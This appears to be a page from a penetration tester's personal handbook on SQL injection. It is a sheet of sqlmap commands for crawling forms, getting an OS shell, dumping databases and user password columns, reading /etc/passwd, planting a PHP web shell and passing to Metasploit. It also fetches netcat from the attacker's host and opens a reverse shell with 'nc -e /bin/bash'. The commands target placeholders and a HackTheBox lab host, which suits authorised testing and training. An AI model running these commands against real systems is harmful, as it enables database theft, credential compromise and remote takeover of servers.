Operators Handbook pg 286
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
#### Crawl and discover SQL injections
```bash - kali
sqlmap -u http://$TARGET --forms --batch --crawl=10 --cookie=PHPSESSID=rqh1ck98suududihja1sl4ljck --level=5 --risk=3 --thread
```
#### os-shell with body data
```bash - kali
sqlmap http://$TARGET/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" --os-shell --fresh-queries
```
Choose an architecture, if you get "no output", redo, try other architecture.
Kali:
```bash - kali
cp /usr/bin/nc .
```
```bash - kali
wget "http://$KALI/nc" -O /tmp/nc
```
```bash - kali
chmod +x /tmp/nc
```
![[1._rlwrap]]
```bash - kali
/tmp/nc -e /bin/bash $KALI 443
```
#### sql-shell
In this example, we enumerate the tables with sqlmap
```bash - kali
proxychains sqlmap -u "$TARGET?id=1" -p job --sql-shell
```
```SQL
select user,password from mysql.user;
```
#### Password Cracking
```bash - kali
sqlmap -u $TARGET?id=1 --password --batch
```
#### File System Access
```bash - kali
sqlmap -u $TARGET?id=1 --privileges --batch
```
```bash - kali
sqlmap -u $TARGET?id=1 --current-user --batch
```
Test the following with /etc/passwd if Unix target.
```bash - kali
sqlmap -u $TARGET?id=1 --file-read=/xampp/htdocs/index.php --batch
```
Test the following with [[Port 22 - SSH  ~#Generate key upload to victim]].
```bash - kali
sqlmap -u $TARGET?id=1 --file-write=/root/Desktop/shell.php --file-dest=/xampp/htdocs/shell.php --batch
```
#### Show databases with body data
```bash - kali
sqlmap http://$TARGET/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" --dbs --thread 5
```
#### Dump Databases
Retrieve DBs:
```bash - kali
sqlmap -u http://$TARGET/blog/single.php?id=1 --dbs
```
Dump entire Database:
```bash - kali
sqlmap -u http://$TARGET/blog/single.php?id=1 -D blog_admin_db --dump
```
Retrieve Tables:
```bash - kali
sqlmap -u http://$TARGET/blog/single.php?id=1 -D blog_admin_db --tables
```
Dump entire Table:
```bash - kali
sqlmap -u http://$TARGET/blog/single.php?id=1 -D blog_admin_db -T banner_posts --dump
```
Retrieve Columns:
```bash - kali
sqlmap -u http://$TARGET/blog/single.php?id=1 -D blog_admin_db -T banner_posts --columns
```
Dump Columns data:
```bash - kali
sqlmap -u http://$TARGET/blog/single.php?id=1 -D blog_admin_db -T banner_posts -C id,stats,title --dump
```
#### Show tables with body data
```bash - kali
sqlmap http://$TARGET/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" --thread 5 -D information_schema --tables
```
```bash - kali
sqlmap http://$TARGET/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" --thread 5 -D mysql --tables
```
```bash - kali
sqlmap http://$TARGET/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" --thread 5 -D  vperformance_schema --tables
```
```bash - kali
sqlmap http://$TARGET/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" --thread 5 -D sys --tables
```
```bash - kali
sqlmap http://$TARGET/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" --thread 5 -D zm --tables
```
#### Show columns with body data
```bash - kali
sqlmap http://$TARGET/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" --thread 5 -D zm --T users --columns
```
#### Dump column data with body data
```bash - kali
sqlmap http://$TARGET/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" --thread 5 -D zm -T Users -C Username,Password --dump
```
#### SQLMAP to Metasploit
```bash - kali
sqlmap http://$TARGET/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" --os-pwn --thread 5
```
#### SQLMAP read a file
```
sqlmap http://preprod-payroll.trick.htb/manage_user.php?id=1 -p id --file-read=/etc/passwd
```
then:
```
open /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd
```
and open files folder to find downloaded files.